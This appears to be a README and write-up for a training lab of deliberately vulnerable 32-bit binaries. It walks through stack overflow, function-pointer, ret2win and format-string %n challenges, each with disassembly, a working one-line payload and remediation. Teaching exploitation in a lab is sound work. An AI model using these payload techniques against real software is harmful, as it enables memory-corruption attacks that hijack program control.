# Hole-In-Bin

## Introduction

Hole-In-Bin is a hands-on learning project focused on reverse engineering
and binary exploitation. The project provides a set of vulnerable binaries
designed to develop a practical understanding of low-level system mechanics,
memory corruption, and common binary vulnerabilities.

## Objectives

- Understand x86 assembly and low-level program execution.
- Analyze stack and heap memory.
- Understand stack frames and memory layouts.
- Identify and analyze different binary vulnerabilities.
- Understand buffer overflow and format string vulnerabilities.
- Practice debugging and binary analysis using GDB/PEDA.
- Develop practical binary exploitation skills in an authorized lab environment.

## Tools

- GDB / PEDA
- Ghidra (Listing View only)
- Radare2
- Python

## x86 Assembly Quick Reference

### General-Purpose Registers

| Register | Common Usage |
|----------|--------------|
| `EAX` | Arithmetic operations, temporary values, and function return values |
| `EBX` | General-purpose register, commonly used to preserve values |
| `ECX` | Counter register, commonly used in loops and string operations |
| `EDX` | General-purpose register; also used with `EAX` for multiplication and division |
| `ESI` | Source index, commonly used for memory and string operations |
| `EDI` | Destination index, commonly used for memory and string operations |
| `EBP` | Base pointer used to reference the current stack frame |
| `ESP` | Stack pointer; points to the current top of the stack |
| `EIP` | Instruction pointer; contains the address of the next instruction to execute |
| `EFLAGS` | Contains CPU status flags such as Zero, Carry, Sign, and Overflow |

### Important Instructions

| Instruction | Description |
|-------------|-------------|
| `mov` | Copies data from a source to a destination |
| `lea` | Loads the effective address of a memory operand |
| `push` | Places a value onto the stack |
| `pop` | Removes a value from the stack |
| `add` | Performs addition |
| `sub` | Performs subtraction |
| `inc` | Increments a value by one |
| `dec` | Decrements a value by one |
| `cmp` | Compares two values and updates the CPU flags |
| `test` | Performs a bitwise AND and updates the CPU flags |
| `jmp` | Performs an unconditional jump |
| `je` / `jz` | Jumps when the Zero Flag is set |
| `jne` / `jnz` | Jumps when the Zero Flag is not set |
| `call` | Calls a function and saves the return address |
| `ret` | Returns from a function using the saved return address |
| `leave` | Restores the previous stack frame |
| `and` | Performs a bitwise AND operation |
| `or` | Performs a bitwise OR operation |
| `xor` | Performs a bitwise XOR operation |
| `imul` | Performs signed multiplication |
| `idiv` | Performs signed division |
| `nop` | Performs no operation and moves to the next instruction |


### argc / argv — 32-bit x86

| Stack offset | Meaning | Size |
|---|---|---|
| `[ebp+0x8]` | `argc` | 4 bytes |
| `[ebp+0xc]` | `argv` | 4 bytes |
| `argv + 0x0` | `argv[0]` | 4 bytes |
| `argv + 0x4` | `argv[1]` | 4 bytes |
| `argv + 0x8` | `argv[2]` | 4 bytes |
| `argv + 0xc` | `argv[3]` | 4 bytes |

**Why `0x4`?**

On 32-bit x86, a pointer is **4 bytes**, so each `argv[i]` entry occupies 4 bytes.

For example:

```asm
mov eax, [ebp+0xc]    ; eax = argv
add eax, 0x4          ; eax = &argv[1]
mov eax, [eax]        ; eax = argv[1]
````

# Challenges

## ex00 - Stack Buffer Overflow

#### Objective

Modify the `modified` variable to reach the target success message:

> `you have changed the 'modified' variable`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pdisass main

0x080483f4 <+0>:     push   ebp
0x080483f5 <+1>:     mov    ebp,esp
0x080483f7 <+3>:     and    esp,0xfffffff0
0x080483fa <+6>:     sub    esp,0x60
0x080483fd <+9>:     mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <+17>:    lea    eax,[esp+0x1c]
0x08048409 <+21>:    mov    DWORD PTR [esp],eax
0x0804840c <+24>:    call   gets@plt
0x08048411 <+29>:    mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <+33>:    test   eax,eax
0x08048417 <+35>:    je     0x8048427
```

**Key Layout Observations:**

* Stack frame allocation: `sub esp, 0x60`
* Input buffer start address: `esp + 0x1c`
* Target variable (`modified`) location: `esp + 0x5c`

---

#### Vulnerability

The program uses the unsafe function `gets()` (`call gets@plt`). Because `gets()` performs no bounds checking on input length, an attacker can write past the allocated buffer boundary and overwrite adjacent stack variables.

---

#### Exploitation

**Offset Calculation:**

```text
0x5c - 0x1c = 0x40 = 64 bytes
```

**Proof of Concept (PoC):**

```bash
python -c 'print "A" * 64 + "B"' | ./bin
```

**Result:**

```bash
user@hole-in-bin:/opt/hole-in-bin/ex00$ python -c 'print "A" * 64 + "B"' | ./bin
you have changed the 'modified' variable
user@hole-in-bin:/opt/hole-in-bin/ex00$ 
```

The 64-byte padding fills the space between the start of the buffer and the `modified` variable. The subsequent non-zero byte (`B`) overwrites `modified`, satisfying the validation check (`test eax, eax`) and triggering the success message.


#### Key Takeaway

This challenge demonstrates how an unchecked memory write can overwrite
a neighboring stack variable. The vulnerability can be analyzed by
understanding the stack layout and calculating the distance between
the input buffer and the target variable.

---

#### Remediation

1. **Use Bounded Functions:** Replace the unsafe `gets()` function with a safe input function:
```c
fgets(buffer, sizeof(buffer), stdin);
```
---

## ex01 - Stack Buffer Overflow

#### Objective

Modify the `modified` variable to hold the specific hexadecimal value:

```bash
0x61626364
```

The challenge is successfully completed when the program outputs:

> `you have correctly got the variable to the right value`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pd main

0x08048464 <+0>:     push   ebp
0x08048465 <+1>:     mov    ebp,esp
0x08048467 <+3>:     and    esp,0xfffffff0
0x0804846a <+6>:     sub    esp,0x60

0x0804846d <+9>:     cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <+13>:    jne    0x8048487 <main+35>

0x08048487 <+35>:    mov    DWORD PTR [esp+0x5c],0x0

0x0804848f <+43>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <+46>:    add    eax,0x4
0x08048495 <+49>:    mov    eax,DWORD PTR [eax]

0x08048497 <+51>:    mov    DWORD PTR [esp+0x4],eax
0x0804849b <+55>:    lea    eax,[esp+0x1c]
0x0804849f <+59>:    mov    DWORD PTR [esp],eax
0x080484a2 <+62>:    call   0x8048368 <strcpy@plt>

0x080484a7 <+67>:    mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <+71>:    cmp    eax,0x61626364
```

**Stack Layout Observations:**

* Destination buffer start: `esp + 0x1c`
* Target variable (`modified`) location: `esp + 0x5c`

**Offset Calculation:**

```text
0x5c - 0x1c = 0x40 = 64 bytes
```

---

#### Vulnerability

The application uses `strcpy()` (`call 0x8048368 <strcpy@plt>`) to copy user input from `argv[1]` into the fixed-size buffer at `esp + 0x1c`. Because `strcpy()` performs no length validation, supplying a string longer than 64 bytes overflows the destination buffer and directly overwrites the adjacent `modified` variable on the stack.

---

#### Exploitation

**Target Value:** `0x61626364`

Because the binary runs on an x86 architecture (**Little-Endian** byte ordering), the bytes must be supplied in reverse order:

```text
\x64 \x63 \x62 \x61  --->  "dcba"
```

**Payload Structure:**

```text
[ 64 Bytes Padding ] + [ "dcba" ]
```

**Proof of Concept (PoC):**

```bash
./bin $(python -c 'print "A" * 64 + "dcba"') 
```

**Result:**

```text
    you have correctly got the variable to the right value
```

The first 64 bytes pad the space from the start of the buffer up to `modified`. The trailing `"dcba"` overwrites `modified` with `0x61626364`, satisfying the comparison check (`cmp eax, 0x61626364`).


#### Key Takeaway

This challenge demonstrates how a stack buffer overflow can be used
to overwrite a variable with a specific value. The required value must
be represented according to the target architecture's byte ordering.


---

#### Remediation

 **Avoid Unsafe Copy Operations:** Replace `strcpy()` with bounded functions that enforce destination buffer limits, such as `strncpy()` or `snprintf()`:
```c
snprintf(buffer, sizeof(buffer), "%s", input);
```

## ex02 - Stack Buffer Overflow

#### Objective

Modify the `modified` variable to hold the specific hexadecimal value:

```bash
0x0d0a0d0a
```

The challenge is successfully completed when the program outputs:

> `you have correctly modified the variable`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pd main

0x08048494 <+0>:     push   ebp
0x08048495 <+1>:     mov    ebp,esp
0x08048497 <+3>:     and    esp,0xfffffff0
0x0804849a <+6>:     sub    esp,0x60

0x0804849d <+9>:     mov    DWORD PTR [esp],0x80485e0
0x080484a4 <+16>:    call   0x804837c <getenv@plt>
0x080484a9 <+21>:    mov    DWORD PTR [esp+0x5c],eax
0x080484ad <+25>:    cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <+30>:    jne    0x80484c8 <main+52>

0x080484c8 <+52>:    mov    DWORD PTR [esp+0x58],0x0

0x080484d0 <+60>:    mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <+64>:    mov    DWORD PTR [esp+0x4],eax
0x080484d8 <+68>:    lea    eax,[esp+0x18]
0x080484dc <+72>:    mov    DWORD PTR [esp],eax
0x080484df <+75>:    call   0x804839c <strcpy@plt>

0x080484e4 <+80>:    mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <+84>:    cmp    eax,0xd0a0d0a
```

**Stack Layout Observations:**

* Destination buffer start: `esp + 0x18`
* Target variable (`modified`) location: `esp + 0x58`

**Offset Calculation:**

```text
0x58 - 0x18 = 0x40 = 64 bytes
```

---

#### Vulnerability

The binary reads user input from an environment variable (`GREENIE`) via `getenv()` and copies it into a fixed-size buffer at `esp + 0x18` using `strcpy()`. Because `strcpy()` does not check input bounds, passing an environment variable longer than 64 bytes overflows the destination buffer and directly overwrites the adjacent `modified` variable on the stack.

---

#### Exploitation

**Target Value:** `0x0d0a0d0a`

Because the binary runs on an x86 architecture (**Little-Endian** byte ordering), the hex bytes must be supplied in reverse order:

```text
\x0a \x0d \x0a \x0d
```

**Payload Structure:**

```text
[ 64 Bytes Padding ] + [ "\x0a\x0d\x0a\x0d" ]
```

**Proof of Concept (PoC):**

```bash
export GREENIE=$(python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"')
./bin
```

**Result:**

```text
you have correctly modified the variable
```

The first 64 bytes pad the space from the start of the buffer up to `modified`. The trailing `"\x0a\x0d\x0a\x0d"` overwrites `modified` with `0x0d0a0d0a`, satisfying the comparison check (`cmp eax, 0xd0a0d0a`).

#### Key Takeaway

This challenge demonstrates that buffer overflow vulnerabilities exist regardless of the input vector (environment variables vs command-line arguments). Input length must always be validated prior to copying into fixed-size stack buffers.

---

#### Remediation

**Avoid Unsafe Copy Operations:** Replace `strcpy()` with bounded functions that enforce destination buffer limits, such as `snprintf()`:

```c
snprintf(buffer, sizeof(buffer), "%s", env_value);
```



## ex03 - Stack Buffer Overflow (Function Pointer Redirection)

#### Objective

Modify the function pointer variable located on the stack to point to the `win()` function address (`0x08048424`).

The challenge is successfully completed when the program outputs:

> `code flow successfully changed`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pd main

0x08048438 <+0>:     push   ebp
0x08048439 <+1>:     mov    ebp,esp
0x0804843b <+3>:     and    esp,0xfffffff0
0x0804843e <+6>:     sub    esp,0x60

0x08048441 <+9>:     mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <+17>:    lea    eax,[esp+0x1c]
0x0804844d <+21>:    mov    DWORD PTR [esp],eax
0x08048450 <+24>:    call   0x8048330 <gets@plt>

0x08048455 <+29>:    cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <+34>:    je     0x8048477 <main+63>

0x0804845c <+36>:    mov    eax,0x8048560
0x08048461 <+41>:    mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <+45>:    mov    DWORD PTR [esp+0x4],edx
0x08048469 <+49>:    mov    DWORD PTR [esp],eax
0x0804846c <+52>:    call   0x8048350 <printf@plt>

0x08048471 <+57>:    mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <+61>:    call   eax

```

**Stack Layout Observations:**

* Destination buffer start: `esp + 0x1c`
* Function pointer location: `esp + 0x5c`
* Target function (`win`) address: `0x08048424`

**Offset Calculation:**

```text
0x5c - 0x1c = 0x40 = 64 bytes
```

---

#### Vulnerability

The program initializes a function pointer at `esp + 0x5c` to `NULL` (`0x0`) and then calls `gets()` to read standard input into a fixed-size buffer at `esp + 0x1c`. Since `gets()` performs no boundary checks, writing past 64 bytes allows direct overwriting of the function pointer. When the program reaches `call eax` (`<main+61>`), execution jumps directly to whatever address is stored in `esp + 0x5c`.

---

#### Exploitation

**Target Address (`win`):** `0x08048424`

Because the binary runs on an x86 architecture (**Little-Endian** byte ordering), the target address bytes must be supplied in reverse order:

```text
\x24 \x84 \x04 \x08
```

**Payload Structure:**

```text
[ 64 Bytes Padding ] + [ "\x24\x84\x04\x08" ]
```

**Proof of Concept (PoC):**

```bash
python -c 'print "A" * 64 + "\x24\x84\x04\x08"' | ./bin
```

**Result:**

```text
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

The first 64 bytes pad the space up to the function pointer. The trailing bytes `\x24\x84\x04\x08` overwrite the pointer with the address of `win()`. When `call eax` is executed, control flow jumps to `win()`, printing `code flow successfully changed`.

---

#### Key Takeaway

This challenge demonstrates how control flow can be hijacked directly by overwriting local function pointers on the stack, bypassing the need to overwrite the saved return address (`EIP`).

---

#### Remediation

1. **Avoid `gets()` Entirely:** Never use `gets()` as it is intrinsically unsafe and deprecated. Replace it with `fgets()`:

```c
fgets(buffer, sizeof(buffer), stdin);
```


## ex04 - Stack Buffer Overflow (Ret2win / Return Address Overwrite)

#### Objective

Overwrite the saved instruction pointer (`Saved EIP`) on the stack to redirect execution control flow to the `win()` function address (`0x080483f4`).

The challenge is successfully completed when the program outputs:

> `code flow successfully changed`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pd main

0x08048408 <+0>:     push   ebp
0x08048409 <+1>:     mov    ebp,esp
0x0804840b <+3>:     and    esp,0xfffffff0
0x0804840e <+6>:     sub    esp,0x50
0x08048411 <+9>:     lea    eax,[esp+0x10]
0x08048415 <+13>:    mov    DWORD PTR [esp],eax
0x08048418 <+16>:    call   0x804830c <gets@plt>
0x0804841d <+21>:    leave  
0x0804841e <+22>:    ret    

```

**Stack Layout Observations:**

* Target function (`win`) address: `0x080483f4`
* Buffer start location: `esp + 0x10`
* Stack allocation size: `sub esp, 0x50` (80 bytes)

---

### Offset Calculation

#### Calculating the EIP Offset with PEDA

Instead of assuming the exact offset from the stack allocation, use PEDA's cyclic pattern to determine it dynamically and precisely.

1. **Generate a pattern:**
```text
gdb-peda$ pattern create 100
```


2. **Run the program and supply the pattern as input:**
```text
gdb-peda$ run
```


*(Paste the generated pattern when prompted for input).*
3. **Inspect the registers after the crash (`SIGSEGV`):**
```text
gdb-peda$ info registers eip
```


4. **Locate the exact offset of the overwritten address:**
```text
gdb-peda$ pattern search
```

**PEDA Output:**

```text
EIP+0 found at offset: 76
```

**Conclusion:**

```text
EIP Offset = 76 bytes
```

This dynamic approach provides the exact location of the saved return address (`Saved EIP`) directly from execution, accounting for any compiler structure or alignment padding.

---

#### Vulnerability

The program uses the unsafe `gets()` function to read input into a fixed-size stack buffer without bounds checking. Overflowing the buffer past 76 bytes overwrites the saved return address (`Saved EIP`) stored on the stack. When `main()` executes `ret`, control flow jumps directly to the address provided in the payload.

---

#### Exploitation

**Target Address (`win`):** `0x080483f4`

Converted to x86 **Little-Endian** byte format:

```text
\xf4 \x83 \x04 \x08
```

**Payload Structure:**

```text
[ 76 Bytes Padding ] + [ "\xf4\x83\x04\x08" ]
```

**Proof of Concept (PoC):**

```bash
python -c 'print "A" * 76 + "\xf4\x83\x04\x08"' | ./bin
```

**Result:**

```text
code flow successfully changed
```

---

#### Key Takeaway

This represents a classic **Ret2win** stack buffer overflow. Overwriting the saved instruction pointer (`Saved EIP`) past local buffer bounds, alignment padding, and saved `EBP` allows direct redirection of the execution flow upon function return (`ret`).

---

#### Remediation

Replace unsafe input functions like `gets()` with bounded functions such as `fgets()`:

```c
fgets(buffer, sizeof(buffer), stdin);
```

## ex05 - Format String / Stack Overflow via sprintf (format0)

#### Objective

Modify the local variable located at `ebp - 0xc` to hold the target hexadecimal value:

```bash
0xdeadbeef
```

The challenge is successfully completed when the program outputs:

> `you have hit the target correctly :)`

---

#### Analysis

Analyzing the `vuln` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pd vuln

0x080483f4 <+0>:     push   ebp
0x080483f5 <+1>:     mov    ebp,esp
0x080483f7 <+3>:     sub    esp,0x68

0x080483fa <+6>:     mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <+13>:    mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <+16>:    mov    DWORD PTR [esp+0x4],eax
0x08048408 <+20>:    lea    eax,[ebp-0x4c]
0x0804840b <+23>:    mov    DWORD PTR [esp],eax
0x0804840e <+26>:    call   0x8048300 <sprintf@plt>

0x08048413 <+31>:    mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <+34>:    cmp    eax,0xdeadbeef
0x0804841b <+39>:    jne    0x8048429 <vuln+53>
```

**Stack Layout Observations:**

* Target variable location: `ebp - 0xc`
* Buffer start location: `ebp - 0x4c`

---

#### Offset Calculation

##### Method 1: Mathematical Calculation

1. Calculate the distance from the start of the buffer (`ebp - 0x4c`) to the target variable (`ebp - 0xc`):

$$\text{Offset} = 0x4c - 0xc = 0x40 = 64 \text{ bytes}$$

---

#### Vulnerability

The program passes user-controlled input (`argv[1]`) directly into `sprintf()` to format it into a local stack buffer (`ebp - 0x4c`) without restricting input length. Supplying a string longer than 64 bytes causes a buffer overflow that overwrites the adjacent local target variable (`ebp - 0xc`).

---

#### Exploitation

**Target Value:** `0xdeadbeef`

Converted to x86 **Little-Endian** byte format:

```text
\xef \xbe \xad \xde
```

**Payload Structure:**

```text
[ 64 Bytes Padding ] + [ "\xef\xbe\xad\xde" ]
```

**Proof of Concept (PoC):**

```bash
./bin $(python -c 'print "A" * 64 + "\xef\xbe\xad\xde"')
```

**Result:**

```text
you have hit the target correctly :)
```

---

#### Key Takeaway

Unbounded formatting functions like `sprintf()` do not perform length checking on destination buffers and are just as vulnerable to stack overflows as `strcpy()` or `gets()`.

---

#### Remediation

Replace `sprintf()` with `snprintf()` to specify and enforce a maximum destination buffer size limit:

```c
snprintf(buffer, sizeof(buffer), "%s", input);
```

## ex06: Heap Unlink Exploitation

The original Protostar Heap 3 exploit does not work directly on Hole-In-Bin because the runtime environment is different.

### Main Differences

- **Heap address changes:**  
  Protostar uses a fixed heap around `0x0804c000`, while Hole-In-Bin uses a runtime-dependent heap address, for example:
  `0x083d6000`, `0x0839c000`, `0x08a48000`.

- **Different libc:**  
  Protostar uses `libc-2.11.2`, while Hole-In-Bin uses `libc-2.19`.

- **Hard-coded heap addresses are invalid:**  
  For example, `0x0804c008` belongs to the Protostar heap, but is unmapped in Hole-In-Bin.

- **Memory permissions matter:**  
  `unlink()` performs pointer-based write-backs, so targeting read-only `.text` memory can cause `SIGSEGV`.  
  Heap shellcode may also fail if the heap is non-executable (NX).

### Conclusion

The Protostar exploit cannot simply be copied to Hole-In-Bin. The heap layout, runtime addresses, libc version, and memory permissions must be re-evaluated for the new environment.

---

## ex07 - Format String Vulnerability 

#### Objective

Modify the target variable entry using a format string vulnerability to reach the required length condition:

> `you have modified the target :)`

---

#### Vulnerability

The program passes user-supplied input directly into `printf()` without a static format string specifier. This allows arbitrary write operations to memory locations using the `%n` specifier.

---

#### Offset & Calculation

* **Target Address:** `0x080496e4` (`\xe4\x96\x04\x08` in Little-Endian)
* **Stack Slot:** Slot 4 (`%4$n`)
* **Padding:** 4 bytes (address) + 60 bytes (`%60x`) = 64 bytes total written to target memory.

---

#### Proof of Concept (PoC)

```bash
    python -c 'print "\xe4\x96\x04\x08" + "A"*60 + "%4$n"' | ./bin
```

**Output:**

```text
you have modified the target :)
```

---

#### Remediation

Always specify a explicit format string when calling formatting functions:

```c
printf("%s", input);
```

---

## ex08 - Format String / Single-Stage %n Write (format3)

#### Objective

Overwrite the target variable at address `0x080496f4` with the full target value to trigger the success check:

> `you have modified the target :)`

---

#### Vulnerability

The application passes user input directly from `fgets` to `printf` inside `printbuffer()` without a static format string. This permits arbitrary memory write primitives using `%n`.

---

#### Offset & Calculation

* **Target Address:** `0x080496f4` (`\xf4\x96\x04\x08` in Little-Endian)
* **Stack Slot:** Slot 12 (`%12$n`)
* **Padding Calculation:**

$$\text{pad} = 16930116 - 4 \text{ bytes (address)} = 16930112$$

---

#### Proof of Concept (PoC)

```bash
python -c 'print "\xf4\x96\x04\x08" + "%16930112c" + "%12$n"' | ./bin

```

**Output:**

```text
you have modified the target :)
```

---

#### Remediation

Ensure print functions strictly define format specifiers for external input:

```c
void printbuffer(char *buffer) {
    printf("%s", buffer);
}
```